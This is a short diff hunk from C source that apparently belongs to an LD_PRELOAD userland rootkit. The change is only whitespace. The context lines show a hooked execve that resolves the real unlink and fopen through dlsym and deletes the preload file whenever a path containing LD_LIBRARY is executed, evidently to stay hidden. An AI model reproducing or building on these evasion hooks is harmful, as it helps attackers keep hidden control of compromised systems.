@@ -225,7 +225,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
     if(strstr(path, LD_LIBRARY) != NULL) {
         if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
         if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen");
-        FILE *ld_preload;        
+        FILE *ld_preload;
 
         old_unlink(PRELOAD_PATH);
         old_execve(path, argv, envp);
